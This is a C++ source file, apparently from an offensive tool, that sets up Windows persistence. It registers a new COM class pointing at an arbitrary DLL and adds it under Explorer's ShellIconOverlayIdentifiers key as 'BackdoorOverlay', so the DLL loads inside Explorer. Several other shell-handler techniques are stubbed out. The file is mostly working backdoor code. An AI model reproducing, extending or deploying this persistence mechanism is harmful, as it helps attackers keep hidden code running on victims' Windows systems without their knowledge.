#include "reg.h"

/*
#define HKCU 0
#define HKCR 1
*/


/*
#define ICON_OVERLAY
#define ICON_HANDLER
#define DROP_HANDLER
#define PROPERTY_SHEET_HANDLER
#define THUMBNAIL_IMAGE_HANDLER
#define INFOTIP_HANDLER
#define METADATA_HANDLER
#define COPY_HOOK_HANDLER
*/

#include <cwchar>


namespace reg {

	GUID CreateBackdoorObj(_In_ BYTE Type, _In_ std::wstring DllPath) {

		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HKEY hKey = (Type) ? HKEY_CLASSES_ROOT : HKEY_CURRENT_USER;
		GUID objGuid = { NULL };
		HRESULT hResult = NULL;
		OLECHAR* guidString;
		DWORD dwKeyRights = KEY_READ | KEY_WRITE | KEY_SET_VALUE;
		
		hResult = CoCreateGuid(&objGuid);
		if (hResult == S_OK) {

			hResult = StringFromCLSID(objGuid, &guidString); // need to check this
			std::wstring subKey = L"CLSID\\" + std::wstring(guidString) + L"\\InProcServer32";
			CoTaskMemFree(guidString);



			status = RegCreateKeyExW(hKey, subKey.c_str(), NULL, NULL, REG_OPTION_NON_VOLATILE, dwKeyRights, NULL, &hkResult, NULL);
			if (status == ERROR_SUCCESS) {
				
				status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE *)DllPath.c_str(), (DWORD)DllPath.size() * 2 );

				if (status == ERROR_SUCCESS) {
				
					const WCHAR* ThreadingModel = L"Apartment";
					status = RegSetValueExW(hkResult, L"ThreadingModel", NULL, REG_SZ, (const BYTE *)ThreadingModel, sizeof(ThreadingModel) * 2 + 2);

					if (status == ERROR_SUCCESS) {
						
						return objGuid;

					}
					else {

						// error adding reg value (ThreadingModel)

					}

				}
				else {
					
					// error adding reg value (DLL Path)
					CloseHandle(hkResult);

				}

			}
			else {

				// error creating reg key


			}

		}
		else {

			// error generating GUID

		}

		return objGuid;


	}

	HKEY AddKey(HKEY hKey, CONST WCHAR* SUBKEY) {

		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HRESULT hResult = NULL;
		OLECHAR* guidString = { 0 };
		DWORD dwKeyRights = KEY_READ | KEY_WRITE | KEY_SET_VALUE;

		status = RegCreateKeyExW(hKey, SUBKEY, NULL, NULL, REG_OPTION_NON_VOLATILE, dwKeyRights, NULL, &hkResult, NULL);
		return (status == ERROR_SUCCESS) ? hkResult : NULL;

	}

	BOOL AddTechnique(_In_ BYTE type, _In_opt_ WCHAR* ext, _In_ GUID Guid) {

		LSTATUS status = NULL;
		HKEY hkResult = NULL;
		HRESULT hResult = NULL;
		switch (type) {

		case ICON_OVERLAY: // HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers\BackdoorOverlay\(Default)
			
			hkResult = AddKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\BackdoorOverlay\\");
			if (hkResult) {
				OLECHAR* guidString;
				hResult = StringFromCLSID(Guid, &guidString);
				size_t sz = wcslen(guidString);
				status = RegSetValueExW(hkResult, NULL, NULL, REG_SZ, (const BYTE*)guidString,(DWORD) sz * 2 + 2);
				break;
			}

		case ICON_HANDLER:
		case DROP_HANDLER:
		case PROPERTY_SHEET_HANDLER:
		case THUMBNAIL_IMAGE_HANDLER:
		case INFOTIP_HANDLER:
		case METADATA_HANDLER:
		case COPY_HOOK_HANDLER:
			break;

		}
		
		
		
		
		
		return (status == ERROR_SUCCESS) ? TRUE : FALSE;



	}
	BOOL RemoveTechnique(DWORD type, WCHAR* ext) {


		return TRUE;

	}

}